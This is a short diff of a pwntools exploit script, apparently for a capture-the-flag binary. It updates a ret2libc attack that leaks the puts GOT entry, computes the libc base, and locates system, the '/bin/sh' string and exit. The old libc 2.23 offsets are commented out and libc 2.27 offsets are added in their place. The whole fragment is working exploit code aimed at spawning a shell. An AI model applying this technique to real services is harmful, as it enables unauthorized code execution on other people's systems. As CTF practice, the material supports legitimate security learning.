@@ -57,13 +57,19 @@ p.sendlineafter("\tselect\t|\t", "4")
 
 p.recvuntil("\t\tBYE BYE\n\n")
 
-# ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu9_i386)
 puts_got = u32(p.recv(4))
 
-libc_base = puts_got - 0x5fca0
-libc_system = libc_base + 0x3ada0
-libc_binsh = libc_base + 0x15b9ab
-libc_exit = libc_base + 0x2e9d0
+# ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu9_i386)
+# libc_base = puts_got - 0x5fca0
+# libc_system = libc_base + 0x3ada0
+# libc_binsh = libc_base + 0x15b9ab
+# libc_exit = libc_base + 0x2e9d0
+
+# libc6_2.27-3ubuntu1_i386
+libc_base = puts_got - 0x67b40
+libc_system = libc_base + 0x3d200
+libc_binsh = libc_base + 0x17e0cf
+libc_exit = libc_base + 0x303d0
 
 debug_print("")
 debug_print("leak libc!")
